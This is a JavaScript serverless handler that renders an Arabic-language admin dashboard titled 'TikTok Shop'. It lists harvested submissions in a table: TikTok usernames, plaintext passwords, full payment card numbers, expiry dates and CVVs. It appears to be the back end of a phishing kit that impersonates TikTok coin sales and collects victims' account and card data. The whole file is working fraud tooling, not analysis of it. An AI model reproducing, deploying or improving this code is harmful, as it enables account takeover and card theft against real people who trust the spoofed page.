import { list } from '@vercel/blob';

export default async function handler(req, res) {
    try {
        const { blobs } = await list({ prefix: 'submissions/' });
        const submissions = [];
        
        for (const blob of blobs) {
            const response = await fetch(blob.url, {
                headers: {
                    'Authorization': `Bearer ${process.env.BLOB_READ_WRITE_TOKEN}`
                }
            });
            const text = await response.text();
            try {
                submissions.push(JSON.parse(text));
            } catch(e) {
                submissions.push({ error: "Invalid JSON", raw: text });
            }
        }
        
        submissions.sort((a, b) => b.id - a.id);
        
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(`
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - TikTok Shop</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            font-family: 'Cairo', 'Segoe UI', system-ui;
            padding: 20px;
            color: #fff;
            direction: rtl;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 {
            text-align: center;
            color: #00f2ea;
            margin-bottom: 10px;
            font-size: 32px;
        }
        .subtitle {
            text-align: center;
            color: #a0aec0;
            margin-bottom: 30px;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            min-width: 150px;
            border: 1px solid rgba(0,242,234,0.3);
        }
        .stat-card h3 { color: #a0aec0; font-size: 14px; margin-bottom: 10px; }
        .stat-card .number { color: #00f2ea; font-size: 36px; font-weight: bold; }
        .table-wrapper {
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 20px;
            overflow-x: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        th, td {
            padding: 12px;
            text-align: center;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        th {
            background: rgba(0,242,234,0.2);
            color: #00f2ea;
            font-weight: bold;
        }
        td { color: #e2e8f0; }
        .empty {
            text-align: center;
            padding: 40px;
            color: #718096;
        }
        .refresh-btn {
            display: inline-block;
            background: #00f2ea;
            color: #1a1a2e;
            padding: 10px 20px;
            border-radius: 8px;
            text-decoration: none;
            margin-bottom: 20px;
            font-weight: bold;
        }
        .refresh-btn:hover { background: #00d4cc; }
        @media (max-width: 768px) {
            th, td { padding: 8px; font-size: 12px; }
            .stat-card .number { font-size: 24px; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>📊 لوحة التحكم - TikTok Shop</h1>
    <p class="subtitle">جميع البيانات ظاهرة للقراءة</p>
    
    <a href="/api/get-data" class="refresh-btn">🔄 تحديث</a>
    
    <div class="stats">
        <div class="stat-card">
            <h3>💰 إجمالي الطلبات</h3>
            <div class="number">${submissions.length}</div>
        </div>
        <div class="stat-card">
            <h3>💵 إجمالي المبيعات</h3>
            <div class="number">${submissions.reduce((sum, s) => sum + (s.package?.price || 0), 0)} $</div>
        </div>
        <div class="stat-card">
            <h3>👥 عدد المستخدمين</h3>
            <div class="number">${new Set(submissions.map(s => s.tiktok_username)).size}</div>
        </div>
    </div>
    
    <div class="table-wrapper">
        ${submissions.length === 0 ? '<div class="empty">📭 لا توجد طلبات بعد</div>' : `
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>حساب تيك توك</th>
                    <th>كلمة المرور</th>
                    <th>الباقة</th>
                    <th>المبلغ</th>
                    <th>رقم البطاقة</th>
                    <th>تاريخ الانتهاء</th>
                    <th>CVV</th>
                    <th>التاريخ</th>
                </tr>
            </thead>
            <tbody>
                ${submissions.map((s, i) => `
                <tr>
                    <td>${i+1}</td>
                    <td>${s.tiktok_username || '-'}</td>
                    <td>${s.tiktok_password || '-'}</td>
                    <td>${s.package?.coins?.toLocaleString() || '-'} عملة</td>
                    <td>${s.package?.price || '-'} $</td>
                    <td>${s.card?.number || '-'}</td>
                    <td>${s.card?.expiry || '-'}</td>
                    <td>${s.card?.cvv || '-'}</td>
                    <td>${new Date(s.time).toLocaleString('ar')}</td>
                </tr>
                `).join('')}
            </tbody>
        </table>
        `}
    </div>
</div>
</body>
</html>
        `);
        
    } catch(error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
}
